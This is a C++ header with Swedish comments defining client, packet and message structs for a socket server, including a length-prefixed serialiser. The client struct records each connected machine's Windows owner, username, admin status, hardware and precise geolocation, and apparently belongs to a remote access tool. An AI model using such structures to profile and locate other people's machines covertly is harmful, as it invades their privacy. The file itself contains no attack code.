#pragma once
#include "precompile.h"

//struktur f�r att kunna hantera en klient
struct client {
	int socket_id{ 0 }; // idet p� socketen som klienten har
	std::string ip_address; // ipaddressen p� klienten
	std::string name; // pseudo namnet p� klienten

	std::unordered_map<std::string, std::string> computer_information = { // h�rd och mjukvaru information om klienten
		{"windows-product",""},
		{"windows-owner",""},
		{"windows-architecture",""},
		{"computer-name",""},
		{"cpu-name", ""},
		{"ram-size",""},
		{"windows-username",""},
		{"running-as-admin", ""}
	};

	std::unordered_map<std::string, std::string> location_information = { // platsbaserad information om klienten
		{"public-ip", ""},
		{"continent", ""},
		{"country", ""},
		{"region", ""},
		{"city", ""},
		{"latitude", ""},
		{"longitude", ""},
		{"language", ""}
	};

	bool operator==(const client& that) const { // vid j�mnf�relse av olika klienter
		return
			ip_address == that.ip_address &&
			socket_id == that.socket_id &&
			name == that.name;
	}

	std::string to_string() {
		return "[ id: " + std::to_string(socket_id ) + ", ip: " + ip_address + ", name: " + name + " ]";
	}
};

inline std::ostream& operator<<(std::ostream& os, const client& m) // vid utskrift av klient
{
	return os << "[" << m.socket_id << "|" << m.ip_address << "|" << m.name << "]";
}
// struktur vid h�mtning av pseudo "tcp" huvudet
struct header {
	int id_size;
	int data_size;
};
//struktur vid h�mtning av ett paket
struct packet {
	std::string id;
	std::string data;
	client* owner;

	bool operator==(const packet& that) const { // vid j�mnf�relse av olika paket
		return
			id == that.id &&
			data == that.data &&
			*owner == *that.owner;
	}

	std::string to_string() {
		return "[" + id + "|" + data.substr(0, 10) + "]\n";
	}
};

// struktur vid skickning av en data eller ett meddelande
struct message {
	std::string identifier;
	std::string data;

	std::string buffer() { // anv�nt f�r att seriliza message strukturten till en str�ng f�r att kunna �verf�ra den via send
		std::stringstream ss; // ett problem med stringstream �r att den tar h�nsyn till locale
		// detta g�r att n�r man skriver r�a siffror till streamen s� bli dem formaterade med komma 1000 -> 1,000
		// detta pajar grejen med serialazation
		// f�r att undvika detta s� har jag valt att konvertera till str�ng innan man skriver till streamen
		ss
			<< std::string(16 - std::to_string(identifier.length()).length(), '0') << std::to_string(identifier.length())
			<< std::string(16 - std::to_string(data.length()).length(), '0') << std::to_string(data.length())
			<< identifier
			<< data;

		return ss.str();
	}
};